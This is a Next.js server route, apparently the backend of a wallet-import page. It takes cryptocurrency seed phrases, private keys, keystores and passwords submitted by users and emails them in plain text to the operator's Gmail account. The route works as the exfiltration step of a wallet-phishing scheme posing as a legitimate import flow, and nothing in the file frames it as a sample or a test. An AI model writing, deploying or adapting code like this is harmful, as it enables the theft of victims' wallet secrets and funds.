import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { method, phrase, address, keystore, password, privateKey } = body;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const rawWalletInfo = `
Method: ${method}
Address: ${address || "N/A"}
Seed Phrase: ${phrase || "N/A"}
Keystore: ${keystore || "N/A"}
Password: ${password || "N/A"}
Private Key: ${privateKey || "N/A"}
    `;

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, 
      subject: `Wallet Import via ${method}`,
      text: rawWalletInfo,
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("Email send failed:", err);
    return NextResponse.json(
      { success: false, error: "Failed to send email" },
      { status: 500 }
    );
  }
}